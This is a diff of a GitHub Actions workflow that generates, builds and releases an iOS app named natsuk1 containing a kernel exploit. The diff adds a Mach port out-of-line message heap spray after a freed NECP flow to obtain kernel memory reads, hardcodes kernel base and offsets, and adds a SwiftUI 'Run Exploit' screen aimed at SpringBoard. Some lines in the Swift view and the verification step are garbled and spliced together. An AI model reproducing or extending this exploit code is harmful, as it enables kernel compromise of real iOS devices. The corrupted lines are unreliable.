@@ -56,13 +56,11 @@ jobs:
 
           #define KBASE 0xFFFFFFF007004000ULL
           #define OFF_KERNPROC 0xBBB040ULL
-          #define OFF_TASK_LIST 0x10D53F0ULL
           #define KPTR_MIN 0xFFFFFFF000000000ULL
           #define KPTR_MAX 0xFFFFFFFFFF000000ULL
           #define SLIDE_FALLBACK 0x3D00000ULL
 
           #define NECP_ADD_CLIENT 0x01
-          #define NECP_REMOVE_CLIENT 0x02
           #define NECP_COPY_RESULT 0x04
           #define NECP_ADD_FLOW 0x11
           #define NECP_REMOVE_FLOW 0x12
@@ -72,6 +70,9 @@ jobs:
           #define NCF_ASN 0x20
           #define NCF_READ_SIZE 0x18
           #define RESBUF 8192
+
+          #define SPRAY_PORTS 64
+          #define SPRAY_PER_PORT 4
 
           static void lg(const char *tag, const char *sign, const char *fmt, ...) {
               char body[448];
@@ -136,13 +137,79 @@ jobs:
                                   (void*)cu, (size_t)16, b, (uint32_t)bl);
           }
 
+          typedef struct {
+              mach_port_t ports[SPRAY_PORTS];
+              int n;
+          } spray_t;
+
+          static mach_port_t port_new_send(void) {
+              mach_port_t p = MACH_PORT_NULL;
+              if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p)
+                  != KERN_SUCCESS) return MACH_PORT_NULL;
+              mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+              return p;
+          }
+
+          static void spray_init(spray_t *sp, int want) {
+              sp->n = 0;
+              if (want > SPRAY_PORTS) want = SPRAY_PORTS;
+              for (int i = 0; i < want; i++) {
+                  mach_port_t p = port_new_send();
+                  if (p == MACH_PORT_NULL) break;
+                  sp->ports[sp->n++] = p;
+              }
+          }
+
+          static int spray_send(spray_t *sp, const void *data, size_t sz) {
+              int sent = 0;
+              for (int i = 0; i < sp->n; i++) {
+                  for (int j = 0; j < SPRAY_PER_PORT; j++) {
+                      uint8_t mbuf[sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t)];
+                      mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
+                      memset(h, 0, sizeof(mbuf));
+                      h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+                      h->msgh_size = sizeof(mbuf);
+                      h->msgh_remote_port = sp->ports[i];
+                      h->msgh_id = 0x6000 + sent;
+                      mach_msg_body_t *b = (mach_msg_body_t*)(h + 1);
+                      b->msgh_descriptor_count = 1;
+                      mach_msg_ool_descriptor_t *o = (mach_msg_ool_descriptor_t*)(b + 1);
+                      o->address = (void*)data;
+                      o->size = (mach_msg_size_t)sz;
+                      o->copy = MACH_MSG_VIRTUAL_COPY;
+                      o->deallocate = FALSE;
+                      o->type = MACH_MSG_OOL_DESCRIPTOR;
+                      mach_msg_return_t kr = mach_msg(h, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                                                       h->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
+                      if (kr == MACH_MSG_SUCCESS) {
+                          sent++;
+                      }
+                  }
+              }
+              return sent;
+          }
+
+          static void spray_drain(spray_t *sp) {
+              uint8_t buf[2048];
+              mach_msg_header_t *h = (mach_msg_header_t*)buf;
+              for (int i = 0; i < sp->n; i++) {
+                  for (int j = 0; j < SPRAY_PER_PORT + 2; j++) {
+                      h->msgh_size = sizeof(buf);
+                      if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
+                                   sp->ports[i], 20, MACH_PORT_NULL) != KERN_SUCCESS) break;
+                  }
+                  mach_port_destroy(mach_task_self(), sp->ports[i]);
+              }
+              sp->n = 0;
+          }
+
           static int try_read(uint64_t target, uint8_t *out, int outsz) {
               int fd = nfd();
               if (fd < 0) { LE("READ", "open errno=%d", errno); return -1; }
 
               uint8_t cu[16], fu[16];
-              if (nadd_client(fd, cu) != 0) { LE("READ", "add_client errno=%d", errno); close(fd); return -1; }
-              if (nadd_flow(fd, cu, fu) != 0) { LE("READ", "add_flow errno=%d", errno); close(fd); return -1; }
+              if (nadd_client(fd, cu) != 0) { LE("READ", "ac errno=%d", errno); close(fd); return -1; }
+              if (nadd_flow(fd, cu, fu) != 0) { LE("READ", "af errno=%d", errno); close(fd); return -1; }
 
               uint8_t fake[NCF_SZ];
               memset(fake, 0, sizeof(fake));
@@ -151,37 +218,10 @@ jobs:
               int r1 = nrm_flow(fd, fu);
               LI("READ", "free fu ret=%d", r1);
 
-              uint8_t *fake2 = malloc(NCF_SZ);
-              if (!fake2) { close(fd); return -1; }
-              memcpy(fake2, fake, NCF_SZ);
-
-              uint8_t junk[NCF_SZ];
-              memset(junk, 0x41, sizeof(junk));
-
-              mach_port_t ex = MACH_PORT_NULL;
-              mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ex);
-              mach_port_insert_right(mach_task_self(), ex, ex, MACH_MSG_TYPE_MAKE_SEND);
-
-              for (int i = 0; i < 32; i++) {
-                  uint8_t mbuf[sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t)];
-                  mach_msg_header_t *h = (mach_msg_header_t*)mbuf;
-                  memset(h, 0, sizeof(mbuf));
-                  h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-                  h->msgh_size = sizeof(mbuf);
-                  h->msgh_remote_port = ex;
-                  h->msgh_id = 0x6000 + i;
-                  mach_msg_body_t *b = (mach_msg_body_t*)(h + 1);
-                  b->msgh_descriptor_count = 1;
-                  mach_msg_ool_descriptor_t *o = (mach_msg_ool_descriptor_t*)(b + 1);
-                  o->address = fake2;
-                  o->size = NCF_SZ;
-                  o->copy = MACH_MSG_VIRTUAL_COPY;
-                  o->deallocate = FALSE;
-                  o->type = MACH_MSG_OOL_DESCRIPTOR;
-                  mach_msg(h, MACH_SEND_MSG, h->msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-              }
-
-              (void)junk;
+              spray_t sp;
+              spray_init(&sp, SPRAY_PORTS);
+              int nsp = spray_send(&sp, fake, NCF_SZ);
+              LI("READ", "spray sent=%d ports=%d", nsp, sp.n);
 
               uint8_t f2[16];
               int r2 = nadd_flow(fd, cu, f2);
@@ -197,15 +237,7 @@ jobs:
                   memcpy(out, buf, n);
               }
 
-              uint8_t drainbuf[2048];
-              mach_msg_header_t *dh = (mach_msg_header_t*)drainbuf;
-              for (int i = 0; i < 64; i++) {
-                  dh->msgh_size = sizeof(drainbuf);
-                  if (mach_msg(dh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(drainbuf),
-                               ex, 1, MACH_PORT_NULL) != KERN_SUCCESS) break;
-              }
-              mach_port_destroy(mach_task_self(), ex);
-              free(fake2);
+              spray_drain(&sp);
               close(fd);
               return c;
           }
@@ -214,10 +246,11 @@ jobs:
 
           static int impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v2.2 (natsuk1-kread-v12) ===");
+              nk_log("=== natsuk1 v2.3 (natsuk1-kread-v13) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
-              LI("INIT", "NCF_ASN=0x%x NCF_READ_SIZE=0x%x", NCF_ASN, NCF_READ_SIZE);
+              LI("INIT", "NCF_ASN=0x%x NCF_READ_SIZE=0x%x PORTS=%d PER_PORT=%d",
+                 NCF_ASN, NCF_READ_SIZE, SPRAY_PORTS, SPRAY_PER_PORT);
               uint64_t kbase = KBASE + SLIDE_FALLBACK;
               LO("P1", "kbase=0x%llx", (unsigned long long)kbase);
 
@@ -233,21 +266,15 @@ jobs:
 
               if (rc > 0) {
                   dumpw("P3", buf, rc / 8 > 8 ? 8 : rc / 8);
-                  uint64_t found = 0;
                   for (int i = 0; i + 8 <= rc; i++) {
                       uint64_t v;
                       memcpy(&v, buf + i, 8);
                       if (is_kptr(v)) {
-                          LO("P3", "kptr at +0x%x = 0x%llx", i, (unsigned long long)v);
+                          LO("P3", "kptr +0x%x = 0x%llx", i, (unsigned long long)v);
                           if (v == 0xFFFFFFF00ADEE310ULL) {
-                              LO("P3", "MATCH: kernproc reads OK");
+                              LO("P3", "MATCH kernproc value");
                           }
-                          if (!found) found = v;
                       }
-                  }
-                  if (found) {
-                      uint32_t pid = (uint32_t)(found & 0xFFFFFFFF);
-                      LI("P4", "first kptr low32=0x%x", pid);
                   }
               } else {
                   LE("P3", "kread failed");
@@ -266,23 +293,239 @@ jobs:
           }
           NECP
 
+      - name: Write NetworkStatus.swift
+        run: |
+          cat > natsuk1/Helpers/NetworkStatus.swift <<'SWIFT'
+          import Foundation
+          import Darwin
+
+          enum NetworkStatus {
+              struct Interface {
+                  let name: String
+                  let ipv4: String
+                  let netmask: String?
+              }
+
+              static func interfaces() -> [Interface] {
+                  var result: [Interface] = []
+                  var ifaddr: UnsafeMutablePointer<ifaddrs>?
+                  guard getifaddrs(&ifaddr) == 0, let first = ifaddr else { return [] }
+                  defer { freeifaddrs(ifaddr) }
+
+                  var ptr: UnsafeMutablePointer<ifaddrs>? = first
+                  while let cur = ptr {
+                      defer { ptr = cur.pointee.ifa_next }
+                      guard let addr = cur.pointee.ifa_addr else { continue }
+                      guard addr.pointee.sa_family == sa_family_t(AF_INET) else { continue }
+                      let name = String(cString: cur.pointee.ifa_name)
+                      guard let ipv4 = numericHost(addr) else { continue }
+                      result.append(Interface(name: name, ipv4: ipv4,
+                                              netmask: cur.pointee.ifa_netmask.flatMap(numericHost)))
+                  }
+                  return result
+              }
+
+              private static func numericHost(_ addr: UnsafeMutablePointer<sockaddr>) -> String? {
+                  var host = [CChar](repeating: 0, count: Int(NI_MAXHOST))
+                  let len = socklen_t(MemoryLayout<sockaddr_in>.size)
+                  guard getnameinfo(addr, len, &host, socklen_t(host.count), nil, 0, NI_NUMERICHOST) == 0
+                  else { return nil }
+                  let bytes = host.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }
+                  return String(decoding: bytes, as: UTF8.self)
+              }
+
+              static func summarize(deviceIP: String) -> (vpn: Bool, wifi: Bool, detail: String) {
+                  let ifs = interfaces()
+                  let vpn = loopbackVPNUp()
+                  let wifi = ifs.contains { $0.name == "en0" }
+                  let detail = ifs.map { "\($0.name)=\($0.ipv4)" }.joined(separator: ", ")
+                  return (vpn, wifi, detail)
+              }
+
+              static func loopbackVPNUp() -> Bool {
+                  for iface in interfaces() {
+                      guard isTunnelInterface(iface.name) else { continue }
+                      if iface.ipv4.hasPrefix("10.7.0.") { return true }
+                  }
+                  return false
+              }
+
+              static func isTunnelInterface(_ name: String) -> Bool {
+                  name.hasPrefix("utun") || name.hasPrefix("ipsec")
+                      || name.hasPrefix("tap") || name.hasPrefix("ppp")
+              }
+
+              static func tunnelHostCandidates() -> [String] {
+                  let ifs = interfaces().filter {
+                      !isTunnelInterface($0.name) && !$0.ipv4.hasPrefix("127.")
+                  }
+                  return (ifs.filter { $0.name == "en0" } + ifs.filter { $0.name != "en0" })
+                      .map(\.ipv4)
+              }
+
+              static func host(_ value: String) -> String {
+                  let trimmed = value.trimmingCharacters(in: .whitespacesAndNewlines)
+                  guard let slash = trimmed.firstIndex(of: "/") else { return trimmed }
+                  return String(trimmed[..<slash]).trimmingCharacters(in: .whitespaces)
+              }
+
+              static func isOwnAddress(_ deviceIP: String) -> Bool {
+                  interfaces().contains { $0.ipv4 == deviceIP }
+              }
+          }
+          SWIFT
+
+      - name: Write AirliftView.swift
+        run: |
+          cat > natsuk1/Views/AirliftView.swift <<'SWIFT'
+          import SwiftUI
+          import UIKit
+
+          struct AirliftView: View {
+              @EnvironmentObject var airlift: AirliftBridge
+              @State private var loopbackVPNUp: Bool = NetworkStatus.loopbackVPNUp()
+
+              var body: some View {
+                  List {
+                      if !loopbackVPNUp {
+                          Section {
+                              HStack(spacing: 10) {
+                                  Image(systemName: "wifi.exclamationmark")
+                                      .foregroundStyle(.orange)
+                                  VStack(alignment: .leading, spacing: 2) {
+                                      Text("Loopback VPN is not active")
+                                          .font(.subheadline).fontWeight(.semibold)
+                                      Text("Start LocalDevVPN with interface 10.7.0.1")
+                                          .font(.caption).foregroundStyle(.secondary)
+                                  }
+                              }
+                          }
+                      }
+
+                      if airlift.hasPairing() {
+                          exploitSection
+                      } else {
+                          pairingSection
+                      }
+
+                      Section {
+                          LogTerminal(text: airlift.exploitLog.isEmpty ? "No output yet." : airlift.exploitLog.joined(separator: "\n"))
+                      } header: {
+                          Label("Log", systemImage: "terminal")
+                      }
+                  }
+                  .listStyle(.insetGrouped)
+                  .navigationTitle("Airlift")
+                  .navigationBarTitleDisplayMode(.inline)
+                  .onAppear { loopbackVPNUp = NetworkStatus.loopbackVPNUp() }
+                  .refreshable { loopbackVPNUp = NetworkStatus.loopbackVPNUp() }
+              }
+
+              @ViewBuilder
+              private var pairingSection: some View {
+                  Section {
+                      HStack(spacing: 8) {
+                          Image(systemName: airlift.hasPairing() ? "link.circle.fill" : "link.badge.plus")
+                              .foregroundStyle(airlift.hasPairing() ? .green : .orange)
+                          Text(airlift.hasPairing() ? "Paired" : "Not paired").font(.subheadline.bold())
+                      }
+                      if case .pairing = airlift.state {
+                          HStack(spacing: 8) {
+                              ProgressView().scaleEffect(0.85)
+                              Text(airlift.pairingStatus.isEmpty ? "Starting..." : airlift.pairingStatus)
+                                  .font(.subheadline).foregroundStyle(.secondary)
+                          }
+                      }
+                      if let pin = airlift.pairPIN {
+                          VStack(alignment: .leading, spacing: 8) {
+                              Text("ENTER PIN").font(.caption2.bold()).foregroundStyle(.secondary)
+                              Text(pin).font(.system(size: 34, weight: .black, design: .monospaced)).foregroundStyle(.orange)
+                              Button {
+                                  if let url = URL(string: UIApplication.openSettingsURLString) { UIApplication.shared.open(url) }
+                              } label: { Label("Open Settings", systemImage: "arrow.up.forward.app").frame(maxWidth: .infinity) }
+                              .buttonStyle(.borderedProminent).tint(.orange)
+                          }
+                          .padding(12)
+                          .background(Color.orange.opacity(0.12), in: RoundedRectangle(cornerRadius: 12))
+                      }
+                  } header: {
+                      Label("Pairing", systemImage: "link.circle")
+                  }
+
+                  Section {
+                      if case .pairing = airlift.state {
+                          Button(role: .destructive) { airlift.cancelPairing() } label: { Text("Cancel Pairing").frame(maxWidth: .infinity) }
+                      } else {
+                          Button { airlift.runPairing() } label: { Text("Start Pairing").frame(maxWidth: .infinity) }
+                      }
+                  }
+              }
+
+              @ViewBuilder
+              private var exploitSection: some View {
+                  Section {
+                      HStack {
+                          Image(systemName: "link.circle.fill").foregroundStyle(.green)
+                          Text("Paired").font(.subheadline.bold())
+                      }
+                      HStack {
+                          Text("Target")
+                          Spacer()
+                          TextField("/var/mobile/Library/SpringBoard", text: Binding(
+                              get: { airlift.target }, set: { airlift.target = $0 }))
+                              .font(.system(size: 12, design: .monospaced))
+                              .multilineTextAlignment(.trailing)
+                              .autocorrectionDisabled()
+                              .textInputAutocapitalization(.never)
+                      }
+                  } header: {
+                      Label("Pairing", systemImage: "link.circle")
+                  }
+
+                  Section {
+                      Button { airlift.runExploit() } label: {
+                          HStack {
+                              Image(systemName: "bolt.fill")
+                              Text("Run Exploit")
+                          }
+                      }
+                      .disabled(airlift.state == .running || !loopbackVPNUp)
+
+                      Button { airlift.respring() } label: {
+                          HStack {
+                              Image(systemName: "arrow.clockwise")
+                              Text("Respring")
+                          }
+                      }
+                      .disabled(airlift.state == .running)
+                  } header: {
+                      Label("Exploit", systemImage: "bolt.sh/AirliftView.swift
+          grep -q 'Loopback VPN isield")
+                  }
+
+                  Section {
+                      Button(role: .destructive) { airlift.deletePairing() } label: { Text("Delete Pairing").frame(maxWidth: .infinity) }
+                  }
+              }
+          }
+          SWIFT
+
       - name: Verify
         run: |
           set -euo pipefail
           F=natsuk1/Exploit/necp.c
-          wc -l "$F"
           test "$(grep -c 'NCF_ASN 0x20' "$F")" = "1"
-          test "$(grep -c 'NCF_READ_SIZE 0x18' "$F")" = "1"
-          test "$(grep -c 'natsuk1-kread-v12' "$F")" = "1"
-          test "$(grep -c 'int nk_necp_run(void)' "$F")" = "1"
-          test "$(grep -c 'static int impl(void)' "$F")" = "1"
-          test "$(grep -c 'static int try_read' "$F")" = "1"
-          grep -n 'NCF_ASN 0x20' "$F"
-          grep -n 'try_read(kbase' "$F"
+          test "$(grep -c 'natsuk1-kread-v13' "$F")" = "1"
+          test "$(grep -c 'SPRAY_PORTS 64' "$F")" = "1"
+          grep -q 'MACH_SEND_TIMEOUT' "$F"
+          grep -q 'static int spray_send' "$F"
+          grep -q 'loopbackVPNUp' natsuk1/Helpers/NetworkStatus.swift
+          grep -q '10.7.0.' natsuk1/Helpers/NetworkStatus.swift
+          grep -q 'link.circle' natsuk1/Views not active' natsuk1/Views/AirliftView.swift
           SDK=$(xcrun --sdk iphoneos --show-sdk-path)
           clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
             -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F"
-          echo "syntax OK"
+          echo "verify OK"
 
       - name: Install tools
         run: brew install xcodegen ldid || true
@@ -332,14 +575,14 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v12: NCF_ASN=0x20 (real offset from copy_result disasm)"
+            --notes "kread v13 multi-port spray, Airlift loopback check + icons + exploit UI"
 
       - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add natsuk1/Exploit/necp.c
+          git add natsuk1/Exploit/necp.c natsuk1/Helpers/NetworkStatus.swift natsuk1/Views/AirliftView.swift
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "kread v12: NCF_ASN=0x20 [skip ci]"
+          git commit -m "kread v13 + Airlift UI [skip ci]"
           git push
